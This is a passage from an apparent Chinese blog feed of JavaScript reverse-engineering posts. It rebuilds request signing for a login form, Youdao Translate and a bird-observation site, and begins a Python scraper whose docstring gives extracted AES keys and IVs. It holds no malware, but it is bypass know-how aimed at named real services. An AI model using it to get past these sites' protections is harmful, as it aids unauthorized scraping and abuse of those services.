class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span> = globalThis;</span><br><span class="line"><span class="keyword">var</span> myLoader;</span><br><span class="line"></span><br><span class="line">(<span class="variable language_">window</span>[<span class="string">&quot;webpackJsonp&quot;</span>] = <span class="variable language_">window</span>[<span class="string">&quot;webpackJsonp&quot;</span>] || []).<span class="title function_">push</span>([[<span class="string">&quot;chunk-vendors&quot;</span>], &#123;...&#125;]);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params">e</span>) &#123;...&#125;)(&#123;...&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i = <span class="title function_">myLoader</span>(<span class="string">&quot;8237&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> l = myLoader.<span class="title function_">n</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d</span>(<span class="params"></span>) &#123;...&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span> (<span class="params">e, t</span>) &#123;...&#125;)(d, <span class="number">185391</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">g</span> = (<span class="params">e, t</span>) =&gt; &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">k</span>(<span class="params">e, t</span>) &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">y</span> = (<span class="params">e, t</span>) =&gt; &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> u = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="number">12333333333</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">    <span class="string">&quot;areaCode&quot;</span>: <span class="string">&quot;+86&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inviteId&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;deviceType&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;captchaTicket&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;captchaRandstr&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sign_appid&quot;</span>: <span class="string">&quot;h5_23514861&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">u[<span class="string">&quot;timestamp&quot;</span>] = <span class="built_in">parseInt</span>((<span class="keyword">new</span> <span class="title class_">Date</span>)[<span class="string">&quot;getTime&quot;</span>]() / <span class="number">1e3</span>);</span><br><span class="line"></span><br><span class="line">u[<span class="string">&quot;nonce&quot;</span>] = <span class="string">&quot;&quot;</span> + <span class="title function_">y</span>(<span class="number">5</span>) + <span class="title class_">Math</span>[<span class="string">&quot;floor&quot;</span>](<span class="number">1e7</span> * <span class="title class_">Math</span>[<span class="string">&quot;random&quot;</span>]()) + <span class="title function_">y</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> t = <span class="string">&#x27;看你麻痹看&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> p = <span class="title function_">g</span>(u, t);</span><br><span class="line">u[<span class="string">&quot;sign&quot;</span>] = p[<span class="string">&quot;toLowerCase&quot;</span>]();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(u));</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;参考文章&quot;&gt;&lt;a href=&quot;#参考文章&quot; class=&quot;headerlink&quot; title=&quot;参考文章&quot;&gt;&lt;/a&gt;参考文章&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.52pojie.cn/thread-2065436-1-1.html&quot;&gt;https</summary>
      
    
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>js逆向-某易有道翻译</title>
    <link href="https://250wuyifan.github.io/2025/10/26/js%E9%80%86%E5%90%91-%E6%9F%90%E6%98%93%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91/"/>
    <id>https://250wuyifan.github.io/2025/10/26/js%E9%80%86%E5%90%91-%E6%9F%90%E6%98%93%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91/</id>
    <published>2025-10-26T15:55:50.000Z</published>
    <updated>2025-10-26T16:23:34.396Z</updated>
    
    <content type="html"><![CDATA[<p>定位xhr</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027000127964.png" alt="image-20251027000127964"></p><p>跟踪堆栈找到这里发现没有sign值，可能在这里加密。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027000255543.png" alt="image-20251027000255543"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027000400662.png" alt="image-20251027000400662"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">S</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_</span>(<span class="string">`client=<span class="subst">$&#123;d&#125;</span>&amp;mysticTime=<span class="subst">$&#123;e&#125;</span>&amp;product=<span class="subst">$&#123;u&#125;</span>&amp;key=<span class="subst">$&#123;t&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把需要的参数直接静态写好即可</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027001012594.png" alt="image-20251027001012594"></p><p>sign值出来之后，直接解密函数搜索json.parse</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027001927394.png" alt="image-20251027001927394"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027002031602.png" alt="image-20251027002031602"></p><p>decodeData指向如下。</p><p>aes解密，密钥写死了，解密即可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O = <span class="function">(<span class="params">e, t, a</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!e)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">const</span> o = l.<span class="title function_">alloc</span>(<span class="number">16</span>, <span class="title function_">T</span>(t))</span><br><span class="line">                  , n = l.<span class="title function_">alloc</span>(<span class="number">16</span>, <span class="title function_">T</span>(a))</span><br><span class="line">                  , r = i.<span class="title function_">createDecipheriv</span>(<span class="string">&quot;aes-128-cbc&quot;</span>, o, n);</span><br><span class="line">                <span class="keyword">let</span> s = r.<span class="title function_">update</span>(e, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> s += r.<span class="title function_">final</span>(<span class="string">&quot;utf-8&quot;</span>),</span><br><span class="line">                s</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026235815878.png" alt="image-20251026235815878"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026235740874.png" alt="image-20251026235740874"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;定位xhr&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027000127964.png&quot; alt=&quot;image-202510270</summary>
      
    
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>js逆向-某国观鸟记录中心活动报告</title>
    <link href="https://250wuyifan.github.io/2025/10/26/js%E9%80%86%E5%90%91-%E6%9F%90%E5%9B%BD%E8%A7%82%E9%B8%9F%E8%AE%B0%E5%BD%95%E4%B8%AD%E5%BF%83%E6%B4%BB%E5%8A%A8%E6%8A%A5%E5%91%8A/"/>
    <id>https://250wuyifan.github.io/2025/10/26/js%E9%80%86%E5%90%91-%E6%9F%90%E5%9B%BD%E8%A7%82%E9%B8%9F%E8%AE%B0%E5%BD%95%E4%B8%AD%E5%BF%83%E6%B4%BB%E5%8A%A8%E6%8A%A5%E5%91%8A/</id>
    <published>2025-10-26T15:49:47.000Z</published>
    <updated>2025-10-26T16:24:53.347Z</updated>
    
    <content type="html"><![CDATA[<p>首先分析header头部的sign和requestID如何加密的，然后分析如何参数加密。</p><p>然后进行返回值的AES解密即可。</p><p>比较简单适合入门学习。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026235459234.png" alt="image-20251026235459234"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026235233505.png" alt="image-20251026235233505"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026235224858.png" alt="image-20251026235224858"></p><h1 id="完整代码如下"><a href="#完整代码如下" class="headerlink" title="完整代码如下"></a>完整代码如下</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">BirdReport API 爬虫 - 完整实现</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">项目地址: https://www.birdreport.cn</span></span><br><span class="line"><span class="string">功能: 获取鸟类观察活动数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string">技术详解</span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. 请求加密 (RSA)</span></span><br><span class="line"><span class="string">   - 算法: RSA PKCS#1 v1.5</span></span><br><span class="line"><span class="string">   - 密钥长度: 1024位</span></span><br><span class="line"><span class="string">   - 分块大小: 117字节/块</span></span><br><span class="line"><span class="string">   - 编码: Base64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2. 签名生成 (MD5)</span></span><br><span class="line"><span class="string">   - 算法: MD5(data + requestId + timestamp)</span></span><br><span class="line"><span class="string">   - 作用: 防止请求被篡改</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3. 响应解密 (AES)</span></span><br><span class="line"><span class="string">   - 算法: AES-256-CBC</span></span><br><span class="line"><span class="string">   - 密钥: 32字节 UTF-8 字符串</span></span><br><span class="line"><span class="string">   - IV: 16字节 UTF-8 字符串</span></span><br><span class="line"><span class="string">   - 填充: PKCS7</span></span><br><span class="line"><span class="string">   - 编码: Base64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4. 密钥来源说明</span></span><br><span class="line"><span class="string">   JavaScript 原始代码中，密钥经过以下转换:</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   步骤1: 原始存储 (十六进制字符串)</span></span><br><span class="line"><span class="string">       key_hex = &quot;6756696653534952657053656868665752665050485566485667545454484967&quot;</span></span><br><span class="line"><span class="string">       iv_hex  = &quot;53536868555767547048526949655455&quot;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   步骤2: 十六进制解码</span></span><br><span class="line"><span class="string">       key_str = bytes.fromhex(key_hex).decode()</span></span><br><span class="line"><span class="string">       # → &quot;gVifSSIRepSehhfWRfPPHUfHVgTTTHIg&quot;</span></span><br><span class="line"><span class="string">       iv_str  = bytes.fromhex(iv_hex).decode()</span></span><br><span class="line"><span class="string">       # → &quot;SShhUWgTpHRiIeTU&quot;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   步骤3: getMapping() 函数转换 (关键步骤!)</span></span><br><span class="line"><span class="string">       mapped_key = getMapping(key_str)</span></span><br><span class="line"><span class="string">       # → &quot;C8EB5514AF5ADDB94B2207B08C66601C&quot;</span></span><br><span class="line"><span class="string">       mapped_iv = getMapping(iv_str)</span></span><br><span class="line"><span class="string">       # → &quot;55DD79C6F04E1A67&quot;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   步骤4: CryptoJS 解析为 WordArray</span></span><br><span class="line"><span class="string">       key = CryptoJS.enc.Utf8.parse(mapped_key)</span></span><br><span class="line"><span class="string">       iv  = CryptoJS.enc.Utf8.parse(mapped_iv)</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   步骤5: AES 解密</span></span><br><span class="line"><span class="string">       CryptoJS.AES.decrypt(encrypted, key, &#123;</span></span><br><span class="line"><span class="string">           iv: iv,</span></span><br><span class="line"><span class="string">           mode: CryptoJS.mode.CBC,</span></span><br><span class="line"><span class="string">           padding: CryptoJS.pad.Pkcs7</span></span><br><span class="line"><span class="string">       &#125;)</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   Python 实现说明:</span></span><br><span class="line"><span class="string">   我们直接使用 getMapping() 转换后的最终结果 (步骤3的输出)，</span></span><br><span class="line"><span class="string">   跳过了原始值和 getMapping 转换步骤，因为最终结果已知且固定。</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">   如果需要完整还原 JS 实现，需要逆向 getMapping() 函数的具体算法。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string">使用示例</span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">from birdreport_api import BirdReportAPI</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 创建API实例</span></span><br><span class="line"><span class="string">api = BirdReportAPI()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 搜索活动（自动处理加密和解密）</span></span><br><span class="line"><span class="string">result = api.search(page=1, limit=20)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if result and result.get(&#x27;code&#x27;) == 0:</span></span><br><span class="line"><span class="string">    print(f&quot;总数据量: &#123;result[&#x27;count&#x27;]&#125;&quot;)</span></span><br><span class="line"><span class="string">    for activity in result[&#x27;data&#x27;]:</span></span><br><span class="line"><span class="string">        print(f&quot;&#123;activity[&#x27;username&#x27;]&#125;: &#123;activity[&#x27;pointName&#x27;]&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span 